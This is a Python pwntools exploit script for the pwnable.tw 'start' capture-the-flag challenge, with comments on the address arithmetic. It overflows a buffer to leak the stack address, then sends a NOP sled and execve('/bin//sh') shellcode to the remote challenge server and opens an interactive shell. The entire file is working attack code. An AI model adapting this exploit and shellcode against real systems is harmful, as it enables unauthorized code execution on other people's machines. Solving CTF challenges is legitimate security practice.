import struct
from pwn import *

###something we need for exploit###
padding = "A"*20
NOP = "\x90"*8 #nopsled, no need but remember we can use nopsled 
EIP1 = struct.pack("I", 0x8048087) #jump to sys_write() to leak the address of $esp before function _start executes. Therefore, $esp is now = address of the leaked $esp - 4
SC = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"#shellcode

#s = process('./start')
s = remote('chall.pwnable.tw', 10000)

payload = padding + EIP1 
print s.recvuntil('CTF:')
s.send(payload) #payload to leak $esp
result = s.recv()

result = (result)[:4] #we just need 4 first bytes
num_addr = struct.unpack("I", result)[0] # convert to number to do some math
num_addr += 0x14 #at the end of _start function, we have 'add esp, 0x14', so the address of return address at that time is = (num_addr - 4) + 0x14 (See the explanation above for why must minus 4)
#Therefore, we redirect the execution to the address num_addr + 0x14, where we will place the shellcode, of course
EIP2 = struct.pack("I", num_addr) #convert to string again
print 'leaked address: %x' % (num_addr - 0x14)
print 'EIP2: %x' % num_addr

raw_input('[ENTER] to send payload 2!')
payload2 = padding + EIP2 + NOP + SC
s.send(payload2)
s.send('ls\n')
out = s.recv()
if (out):
	print 'PWNED SUCCESSFULLY'
else:
	print out
s.interactive()
